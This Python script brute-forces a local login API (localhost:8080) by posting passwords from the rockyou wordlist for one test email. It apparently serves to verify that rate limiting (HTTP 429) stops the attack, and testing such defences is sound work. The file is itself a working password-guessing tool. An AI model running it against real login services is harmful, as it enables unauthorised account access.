import requests
import time

TARGET_URL = 'http://localhost:8080/api/auth/login'
EMAIL = 'student@test.com'
WORDLIST = '/usr/share/wordlists/rockyou.txt'

attempts = 0
start_time = time.time()

print(f"Starting brute force on {TARGET_URL}")
print(f"Target: {EMAIL}\n")

with open(WORDLIST, 'r', encoding='latin-1', errors='ignore') as f:
    for password in f:
        password = password.strip()
        attempts += 1

        try:
            response = requests.post(TARGET_URL, json={
                'email': EMAIL,
                'password': password
            })

            if response.status_code == 429:
                elapsed = time.time() - start_time
                print(f"\n[RATE LIMITED] After {attempts} attempts in {elapsed:.2f}s")
                print(f"Rate limiting active: max 5 login attempts per 15 minutes")
                exit(1)

            data = response.json()

            if 'token' in data:
                elapsed = time.time() - start_time
                print(f"\n[SUCCESS] Password: {password}")
                print(f"Attempts: {attempts} | Time: {elapsed:.2f}s")
                exit(0)

        except Exception:
            pass

        if attempts % 100 == 0:
            print(f"[INFO] Tried {attempts} passwords...")

print(f"\n[FAILED] Not found after {attempts} attempts")
